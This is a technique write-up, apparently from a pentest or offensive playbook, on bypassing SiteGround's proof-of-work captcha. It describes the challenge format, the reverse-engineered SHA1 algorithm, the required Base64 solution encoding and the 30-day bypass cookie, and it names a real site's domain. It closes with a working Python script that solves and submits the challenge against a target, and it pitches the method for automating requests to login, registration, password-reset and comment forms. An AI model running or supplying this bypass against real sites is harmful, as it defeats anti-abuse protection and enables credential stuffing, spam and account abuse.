# PoW-Based Captcha Bypass

## Overview

SG Captcha (SiteGround Captcha) and similar PoW-based captcha systems can be bypassed by solving the client-side Proof-of-Work challenge server-side. The PoW is typically a SHA1 hash with low complexity (21 bits), solvable in under 1 second with a simple Python script.

## When to Use This

When a target uses SG Captcha or similar PoW captchas on login forms, registration, password reset, or comment forms, and you need to automate requests that would otherwise be blocked by the captcha challenge.

## Challenge Format

```javascript
const sgchallenge="21:1791125747:52cae0b0:9de4659a26642a5c6e146c54eda7f6f1d6302b3dcfc1c8357b28141a3bc96d0f:";
const sgsubmit_url="/.well-known/sgcaptcha/?r=%2F";
```

Parts: `complexity:timestamp:random:hash:`

## PoW Algorithm (Reverse-Engineered from Worker Code)

The worker (inline JS on the captcha page) computes SHA1(challenge_bytes + counter_bytes) and checks if the first 4 bytes have `complexity` leading zero bits. Counter is 1-4 bytes big-endian.

## Solution Format — CRITICAL DETAIL

The solution is `base64(challenge_bytes + counter_bytes)`. This specific encoding
matters — the worker's `d()` function returns `o().stringify(f)` where:
- `f` = WordArray of `(challenge_bytes + counter_bytes)` — the PoW INPUT, not the hash
- `o = r.n(r(269))` — module 269 extends the CryptoJS core with `enc.Base64`
- `o().stringify(f)` calls the Base64 encoder on the WordArray

Other encodings (latin1, hex, raw counter string) are REJECTED by the server.
The `s` parameter format is `elapsed_ms:hash_count` where hash_count is the
number of SHA1 attempts made (counter + 1 for zero-indexed).

## Solution & Submission

1. Solve PoW: find counter where SHA1(challenge + counter) has `complexity` zero bits
2. Encode solution as base64(challenge_bytes + counter_bytes) — MUST be Base64, not other encodings
3. Submit via GET: `GET sgsubmit_url?sol=<base64>&s=<elapsed_ms>:<hash_count>`
4. Server sets `_I_` cookie (30-day session cookie) that bypasses future captcha challenges

## Session Persistence

The `_I_` cookie format: `_I_=<sha256_hash>-<unix_timestamp>-<complexity>`
- Expires: 30 days (max-age=2592000)
- Applies to: `.markets.trendspider.com` (domain-wide)
- Re-usable: the same cookie bypasses captcha on all subsequent requests until expiry
- Renewal: each new PoW solution generates a new `_I_` cookie with an updated timestamp

## Python PoC

```python
import hashlib, struct, base64, requests, re

def int_to_bytes(n):
    if n <= 255: return struct.pack('>B', n)
    elif n <= 65535: return struct.pack('>H', n)
    elif n <= 16777215: return struct.pack('>I', n)
    return struct.pack('>I', n)

def solve_pow(challenge, complexity, max_attempts=200000000):
    cb = challenge.encode('utf-8')
    for counter in range(max_attempts):
        data = cb + int_to_bytes(counter)
        h = hashlib.sha1(data).digest()
        if struct.unpack('>I', h[:4])[0] >> (32 - complexity) == 0:
            return counter
    return None

session = requests.Session()
session.cookies.set('wpSGCacheBypass', '1')
session.get(f"https://TARGET/", allow_redirects=True)
captcha = session.get(f"https://TARGET/.well-known/sgcaptcha/?r=%2F")

challenge = re.search(r'sgchallenge\s*=\s*"([^"]+)"', captcha.text).group(1)
submit_url = re.search(r'sgsubmit_url\s*=\s*"([^"]+)"', captcha.text).group(1)
complexity = int(challenge.split(':')[0])

counter = solve_pow(challenge, complexity)
solution = base64.b64encode(challenge.encode('utf-8') + int_to_bytes(counter)).decode()

session.get(f"https://TARGET{submit_url}",
    params={'sol': solution, 's': f'1000:{counter+1}'}, allow_redirects=True)
# _I_ cookie is now set — captcha bypassed
```

## Performance

Complexity 21: ~1M expected attempts, 0.5-3s single-threaded Python (500K-650K H/s).